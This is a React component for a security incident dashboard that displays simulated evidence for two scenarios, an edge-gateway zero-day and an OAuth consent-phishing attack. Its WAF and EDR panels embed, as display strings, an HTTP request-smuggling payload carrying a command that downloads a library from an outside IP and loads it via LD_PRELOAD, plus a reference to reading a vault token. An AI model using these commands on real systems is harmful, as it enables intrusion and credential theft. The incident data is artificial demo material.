import { useState } from "react"
import { Badge } from "@foundry/ui/components/badge"
import { Card, CardContent, CardHeader, CardTitle } from "@foundry/ui/components/card"
import {
  ShieldAlert,
  Terminal,
  FileCode,
  Network,
  Copy,
  Check,
  ShieldCheck,
} from "lucide-react"
import type { Incident } from "@/lib/model"

interface IncidentEvidenceProps {
  incident: Incident
}

interface IOCItem {
  value: string
  type: string
  verdict: "critical" | "high" | "warning" | "suspicious"
  containment: string
  mitreTactic: string
}

function getIOCsForIncident(incident: Incident): IOCItem[] {
  if (incident.scenarioId === "zero-day-edge" || incident.code === "PLX-1041" || incident.code === "ESP-1041") {
    return [
      {
        value: "185.121.44.19",
        type: "IPv4 C2 Infrastructure",
        verdict: "critical",
        containment: "Perimeter BGP Null-Route & Egress Firewall Block",
        mitreTactic: "T1071.001 (Web Protocols)",
      },
      {
        value: "cdn-status-check.net",
        type: "Adversary Domain / DNS",
        verdict: "critical",
        containment: "CoreDNS Sinkholed & SNI Filtering Active",
        mitreTactic: "T1071.004 (DNS)",
      },
      {
        value: "libedgetls.so.2",
        type: "LD_PRELOAD Rootkit Hook",
        verdict: "critical",
        containment: "Host Isolated (edge-gw-01) & Hash Blacklisted",
        mitreTactic: "T1574.006 (LD_PRELOAD)",
      },
      {
        value: "svc-deploy",
        type: "Compromised Service Principal",
        verdict: "high",
        containment: "IAM STS Session Revoked & Credentials Rotated",
        mitreTactic: "T1078.004 (Cloud Accounts)",
      },
      {
        value: "edge-gw-01",
        type: "Compromised Ingress Host",
        verdict: "critical",
        containment: "VLAN Quarantined & Live Memory Dump Captured",
        mitreTactic: "T1190 (Exploit Public-Facing App)",
      },
    ]
  }

  if (incident.scenarioId === "identity-front" || incident.code === "PLX-1042" || incident.code === "ESP-1042") {
    return [
      {
        value: "app-id 9f31c0",
        type: "Illicit OAuth Enterprise App",
        verdict: "critical",
        containment: "Tenant Consent Revoked & Service Principal Evicted",
        mitreTactic: "T1528 (Application Access Token)",
      },
      {
        value: "cdn-status-check.net",
        type: "OAuth Redirect C2 Domain",
        verdict: "critical",
        containment: "DNS Sinkholed & Outbound Web Proxy Blocked",
        mitreTactic: "T1071.001 (Web Protocols)",
      },
      {
        value: "r.almeida",
        type: "Phished Corporate Account",
        verdict: "high",
        containment: "Active Sessions Revoked & Forced MFA Reset",
        mitreTactic: "T1566.002 (Spearphishing Link)",
      },
      {
        value: "corp-idp-01",
        type: "Target Identity Provider",
        verdict: "high",
        containment: "Audit Logs Exported & Graph API App Locked Down",
        mitreTactic: "T1098.005 (Device Registration)",
      },
    ]
  }

  // Fallback for live range or custom
  return incident.indicators.map((ind) => ({
    value: ind,
    type: ind.includes(".") ? (ind.match(/\d+\.\d+\.\d+\.\d+/) ? "IP Address" : "Domain Name") : "Indicator",
    verdict: "high",
    containment: "Active Defense Automated Containment Enforced",
    mitreTactic: "TA0040 (Impact / Defense Evasion)",
  }))
}

export function IncidentEvidence({ incident }: IncidentEvidenceProps) {
  const [activeTab, setActiveTab] = useState<string>("iocs")
  const [copiedValue, setCopiedValue] = useState<string | null>(null)

  const iocs = getIOCsForIncident(incident)

  const copyToClipboard = (text: string) => {
    void navigator.clipboard.writeText(text)
    setCopiedValue(text)
    setTimeout(() => setCopiedValue(null), 2000)
  }

  const isZeroDay = incident.scenarioId === "zero-day-edge" || incident.code === "PLX-1041" || incident.code === "ESP-1041"

  return (
    <div className="flex flex-col gap-3">
      {/* Evidence & IOC Navigation Tabs */}
      <div className="flex items-center gap-1.5 overflow-x-auto border-b border-border/60 pb-2">
        <button
          type="button"
          onClick={() => setActiveTab("iocs")}
          className={`flex items-center gap-1.5 rounded-item px-2.5 py-1 text-xs font-medium transition-colors ${
            activeTab === "iocs"
              ? "bg-primary text-primary-foreground shadow-sm"
              : "text-muted-foreground hover:bg-accent hover:text-foreground"
          }`}
        >
          <ShieldAlert className="size-3.5" />
          <span>Indicators of Compromise ({iocs.length})</span>
        </button>
        <button
          type="button"
          onClick={() => setActiveTab("waf")}
          className={`flex items-center gap-1.5 rounded-item px-2.5 py-1 text-xs font-medium transition-colors ${
            activeTab === "waf"
              ? "bg-primary text-primary-foreground shadow-sm"
              : "text-muted-foreground hover:bg-accent hover:text-foreground"
          }`}
        >
          <FileCode className="size-3.5" />
          <span>{isZeroDay ? "WAF / Ingress Telemetry" : "OAuth Consent Log"}</span>
        </button>
        <button
          type="button"
          onClick={() => setActiveTab("edr")}
          className={`flex items-center gap-1.5 rounded-item px-2.5 py-1 text-xs font-medium transition-colors ${
            activeTab === "edr"
              ? "bg-primary text-primary-foreground shadow-sm"
              : "text-muted-foreground hover:bg-accent hover:text-foreground"
          }`}
        >
          <Terminal className="size-3.5" />
          <span>{isZeroDay ? "EDR Process Tree" : "Graph API Audit Trail"}</span>
        </button>
        <button
          type="button"
          onClick={() => setActiveTab("netflow")}
          className={`flex items-center gap-1.5 rounded-item px-2.5 py-1 text-xs font-medium transition-colors ${
            activeTab === "netflow"
              ? "bg-primary text-primary-foreground shadow-sm"
              : "text-muted-foreground hover:bg-accent hover:text-foreground"
          }`}
        >
          <Network className="size-3.5" />
          <span>{isZeroDay ? "NetFlow C2 Beaconing" : "Mailbox Enumeration Flow"}</span>
        </button>
      </div>

      {/* Tab: Indicators of Compromise */}
      {activeTab === "iocs" && (
        <Card className="border-border/70 bg-card/60">
          <CardHeader className="pb-2">
            <div className="flex items-center justify-between">
              <CardTitle className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                Threat Intelligence & Extracted IOCs
              </CardTitle>
              <Badge variant="outline" className="font-mono text-[10px] text-primary">
                Swarm Verified
              </Badge>
            </div>
          </CardHeader>
          <CardContent className="pt-1">
            <div className="flex flex-col divide-y divide-border/40">
              {iocs.map((ioc) => (
                <div key={ioc.value} className="flex flex-col gap-1.5 py-2.5 sm:flex-row sm:items-center sm:justify-between">
                  <div className="flex items-start gap-2.5 min-w-0">
                    <button
                      type="button"
                      onClick={() => copyToClipboard(ioc.value)}
                      title="Click to copy IOC"
                      className="group mt-0.5 flex items-center gap-1.5 rounded bg-muted/60 px-1.5 py-0.5 font-mono text-xs font-medium text-foreground hover:bg-muted"
                    >
                      <span className="truncate">{ioc.value}</span>
                      {copiedValue === ioc.value ? (
                        <Check className="size-3 text-positive" />
                      ) : (
                        <Copy className="size-3 opacity-40 group-hover:opacity-100" />
                      )}
                    </button>
                    <div className="flex flex-wrap items-center gap-1.5">
                      <span className="text-[11px] text-muted-foreground">{ioc.type}</span>
                      <span className="font-mono text-[10px] text-muted-foreground/80">• {ioc.mitreTactic}</span>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    <span className="flex items-center gap-1 text-[11px] text-emerald-400">
                      <ShieldCheck className="size-3.5" />
                      <span>{ioc.containment}</span>
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}

      {/* Tab: WAF / Ingress Telemetry */}
      {activeTab === "waf" && (
        <Card className="border-border/70 bg-card/60">
          <CardHeader className="pb-2">
            <div className="flex items-center justify-between">
              <CardTitle className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                {isZeroDay ? "Perimeter Ingress HTTP Desync Artifact" : "Azure AD / IdP Consent Grant Event"}
              </CardTitle>
              <Badge variant="outline" className="font-mono text-[10px] text-rose-400">
                Rule: {isZeroDay ? "HTTP-DESYNC-HEURISTIC" : "UNKNOWN-APP-CONSENT"}
              </Badge>
            </div>
          </CardHeader>
          <CardContent className="pt-1">
            <div className="overflow-x-auto rounded-item bg-muted/30 p-3 font-mono text-[11px] leading-relaxed text-foreground/90">
              {isZeroDay ? (
                <pre>
{`POST /admin/_health HTTP/1.1
Host: edge-gw-01.corp.internal
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Transfer-Encoding: chunked
Content-Length: 4
X-Forwarded-For: 185.121.44.19
Connection: keep-alive

0

POST /api/v1/internal/exec HTTP/1.1
Host: edge-gw-01.corp.internal
Authorization: Bearer <tampered-jwt-pre-auth>
Content-Type: application/json

{"cmd": "/bin/sh -c 'curl -s http://185.121.44.19/stage2.so -o /tmp/libedgetls.so.2 && LD_PRELOAD=/tmp/libedgetls.so.2'"}
`}
                </pre>
              ) : (
                <pre>
{`{
  "eventId": "evt_consent_9f31c0a8",
  "timestamp": "2026-09-13T02:14:10Z",
  "category": "ApplicationManagement",
  "activityDisplayName": "Consent to application",
  "target": {
    "appId": "9f31c0-481e-4a92",
    "displayName": "Sync-Analytics-V2",
    "publisherDomain": "cdn-status-check.net",
    "verifiedPublisher": false
  },
  "initiatedBy": {
    "userPrincipalName": "r.almeida@corp.internal",
    "department": "Finance",
    "ipAddress": "198.51.100.44"
  },
  "grantedPermissions": [
    "Mail.Read",
    "MailboxSettings.ReadWrite",
    "Files.Read.All",
    "offline_access"
  ],
  "riskScore": 96,
  "verdict": "ANOMALOUS_UNVERIFIED_MULTI_TENANT_OAUTH"
}`}
                </pre>
              )}
            </div>
          </CardContent>
        </Card>
      )}

      {/* Tab: EDR Process Tree */}
      {activeTab === "edr" && (
        <Card className="border-border/70 bg-card/60">
          <CardHeader className="pb-2">
            <div className="flex items-center justify-between">
              <CardTitle className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                {isZeroDay ? "Host EDR Process Lineage & Memory Dump" : "Graph API High-Velocity Audit Trail"}
              </CardTitle>
              <Badge variant="outline" className="font-mono text-[10px] text-amber-400">
                {isZeroDay ? "Host: edge-gw-01" : "Host: corp-fs-03"}
              </Badge>
            </div>
          </CardHeader>
          <CardContent className="pt-1">
            <div className="overflow-x-auto rounded-item bg-muted/30 p-3 font-mono text-[11px] leading-relaxed text-foreground/90">
              {isZeroDay ? (
                <pre>
{`[02:14:11] systemd (PID 1)
 └── rivet-edge (PID 1042, user: edge-svc, TLS Terminator)
      └── [ALERT] /bin/sh (PID 2108, user: edge-svc)
           ├── curl -s http://185.121.44.19/stage2.so -o /tmp/libedgetls.so.2 (PID 2109) [RC=0]
           └── python3 -c import os,socket... (PID 2110)
                ├── [INJECTION] LD_PRELOAD=/tmp/libedgetls.so.2 hooked ssl_read/ssl_write
                ├── Socket: 10.0.1.10:49214 -> 185.121.44.19:443 [ESTABLISHED]
                └── Child: svc-deploy credential extraction from /etc/vault/token [T1555]

[CONTAINMENT VERIFICATION]
-> Phalanx Containment Agent Bulwark issued 'isolate_host(edge-gw-01)' at 02:14:48
-> EDR agent killed PID 2108, 2110; removed /tmp/libedgetls.so.2
-> Host isolation confirmed: 0 ingress/egress packets permitted except sensor telemetry`}
                </pre>
              ) : (
                <pre>
{`[02:14:15] OAuth Client 9f31c0 authenticated via token refresh (IP: 185.121.44.19)
[02:14:16] GET /v1.0/users/r.almeida@corp.internal/messages -> 200 OK (50 messages)
[02:14:18] GET /v1.0/sharedMailboxes -> 200 OK (Enumerated 214 finance mailboxes)
[02:14:21] Batch Query: /v1.0/users/finance-team/messages?$search="wire transfer OR invoice"
[02:14:24] 84 sensitive attachments downloaded in 60 seconds (Total 142 MB)

[CONTAINMENT VERIFICATION]
-> Phalanx Identity Keystone revoked OAuth client 9f31c0 via Microsoft Graph API
-> All delegated user refresh tokens invalidated
-> Perimeter proxy blocked outbound requests to cdn-status-check.net`}
                </pre>
              )}
            </div>
          </CardContent>
        </Card>
      )}

      {/* Tab: NetFlow / Beaconing Analysis */}
      {activeTab === "netflow" && (
        <Card className="border-border/70 bg-card/60">
          <CardHeader className="pb-2">
            <div className="flex items-center justify-between">
              <CardTitle className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                {isZeroDay ? "NetFlow Deep Packet & Cadence Analysis" : "Exfiltration Bandwidth & Data Flow"}
              </CardTitle>
              <Badge variant="outline" className="font-mono text-[10px] text-cyan-400">
                Rule: {isZeroDay ? "PERIODIC-EGRESS" : "BULK-OBJECT-READ"}
              </Badge>
            </div>
          </CardHeader>
          <CardContent className="pt-1">
            <div className="overflow-x-auto rounded-item bg-muted/30 p-3 font-mono text-[11px] leading-relaxed text-foreground/90">
              {isZeroDay ? (
                <pre>
{`Flow Record ID: FLW-2026-9481
Protocol: IP / TCP (443)
Source: 10.0.1.10:49214 (edge-gw-01)
Destination: 185.121.44.19:443 (cdn-status-check.net)

Temporal Characteristics:
• Beacon Interval: 47.18 seconds
• Jitter: ±0.32s (Heuristic score: 0.99 Machine Determinism)
• Total Flow Sessions: 4,102
• Total Exfiltrated: 284 MB (customer export objects from data-obj-01)

Mitigation Executed:
-> iptables -I FORWARD -d 185.121.44.19 -j DROP (Perimeter Gateway)
-> Autonomous DNS sinkhole redirecting cdn-status-check.net to 127.0.0.1
-> 0 remaining active connections detected`}
                </pre>
              ) : (
                <pre>
{`Flow Record ID: FLW-2026-9502
Protocol: HTTPS / Microsoft Graph API REST
Client IP: 185.121.44.19 (Adversary Proxy Node)
Target: Exchange Online / Sharepoint Tenant (corp-fs-03)

Exfiltration Pattern:
• Concurrent HTTP streams: 16
• High-value keywords: "invoice", "bank details", "wire instruction", "private key"
• Bulk object extraction: 3,140 items downloaded
• Interception: Swarm halted exfiltration at minute 2:45 before crown-jewel export bucket reached.`}
                </pre>
              )}
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  )
}
